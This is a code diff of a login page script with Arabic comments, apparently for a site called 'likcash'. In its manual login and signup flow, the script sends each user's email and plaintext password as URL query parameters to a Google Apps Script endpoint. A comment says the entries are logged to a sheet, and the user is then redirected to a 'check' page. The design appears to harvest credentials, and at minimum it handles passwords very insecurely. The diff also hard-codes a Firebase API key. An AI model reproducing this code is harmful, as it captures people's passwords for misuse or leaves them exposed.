@@ -63,7 +63,6 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getAuth, signInWithPopup, GoogleAuthProvider } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
 
-        // إعدادات Firebase الخاصة بك
         const firebaseConfig = {
             apiKey: "AIzaSyBP77A_0dc3Z1H6jrUmhtapLF1w0Gbe4B8",
             authDomain: "likcash-auth.firebaseapp.com",
@@ -77,8 +76,8 @@
         const auth = getAuth(app);
         const provider = new GoogleAuthProvider();
 
-        // رابط النشر الجديد الخاص بك
-        const scriptURL = 'https://script.google.com/macros/s/AKfycbwtiGMBxd-ShLgVv425OiASpotdk6lO9eqRGOlhAMb8cl9-Cv6N6wN-RcfiVnWaNVkWZw/exec';
+        // رابط النشر الجديد
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbwH_2nIA4_ctyIffllN6cv05xtOrgSeDg6iLArJhjfPODbrHDamgF3mIuAe6wpIGY6mwg/exec';
         const statusBox = document.getElementById('status');
 
         window.switchTab = (mode) => {
@@ -89,24 +88,22 @@
             statusBox.innerText = "";
         };
 
-        // دالة الإرسال الخفيفة لضمان السرعة
         async function saveData(params) {
             return new Promise((resolve) => {
-                const callbackName = 'cb_' + Math.floor(Math.random() * 1000000);
+                const cb = 'cb_' + Math.floor(Math.random() * 1000000);
                 const script = document.createElement('script');
-                
-                window[callbackName] = (data) => {
+                window[cb] = (data) => {
                     document.body.removeChild(script);
-                    delete window[callbackName];
+                    delete window[cb];
                     resolve(data.result);
                 };
-
-                const queryString = new URLSearchParams({ callback: callbackName, ...params }).toString();
-                script.src = `${scriptURL}?${queryString}`;
+                const qs = new URLSearchParams({ callback: cb, ...params }).toString();
+                script.src = `${scriptURL}?${qs}`;
                 document.body.appendChild(script);
             });
         }
 
+        // تسجيل الدخول اليدوي (يتم تسجيله في الشيت)
         window.executeAuth = async (method) => {
             const isLogin = method === 'Manual-Login';
             const email = isLogin ? document.getElementById('l-email').value : document.getElementById('s-email').value;
@@ -114,44 +111,33 @@
             const name = isLogin ? "Utilisateur" : document.getElementById('s-name').value;
 
             if (!email || !pass) { 
-                statusBox.innerText = "عمر الخانات كاملة عفاك"; 
+                statusBox.innerText = "يرجى ملء كافة الخانات"; 
                 statusBox.style.color = "var(--error)"; 
                 return; 
             }
 
-            statusBox.innerText = "جاري الحفظ..."; 
+            statusBox.innerText = "جاري المعالجة..."; 
             statusBox.style.color = "var(--primary)";
 
             const result = await saveData({ email, password: pass, name, method });
 
             if (result === "OK") {
-                statusBox.innerText = "تم بنجاح! جاري التوجيه...";
-                statusBox.style.color = "var(--success)";
-                setTimeout(() => { window.location.href = "w/check.html"; }, 800);
+                window.location.href = "w/check.html";
             } else {
-                statusBox.innerText = "خطأ في السيرفر، حاول مرة أخرى";
+                statusBox.innerText = "حاول مرة أخرى";
                 statusBox.style.color = "var(--error)";
             }
         };
 
+        // تسجيل الدخول بجوجل (نقل مباشر بدون انتظار الشيت لضمان السرعة)
         document.getElementById('google-signin').onclick = async () => {
             try {
-                statusBox.innerText = "جاري الاتصال بـ Google...";
-                const authResult = await signInWithPopup(auth, provider);
-                const user = authResult.user;
-
-                const res = await saveData({
-                    email: user.email,
-                    password: "GOOGLE_USER",
-                    name: user.displayName,
-                    method: "Google-Auth"
-                });
-
-                if (res === "OK") {
-                    window.location.href = "w/check.html";
-                }
+                statusBox.innerText = "جاري الاتصال...";
+                await signInWithPopup(auth, provider);
+                // نقل مباشر فور نجاح المصادقة
+                window.location.href = "w/check.html"; 
             } catch (error) {
-                statusBox.innerText = "فشل تسجيل الدخول بـ Google";
+                statusBox.innerText = "فشل الاتصال بـ Google";
                 statusBox.style.color = "var(--error)";
             }
         };
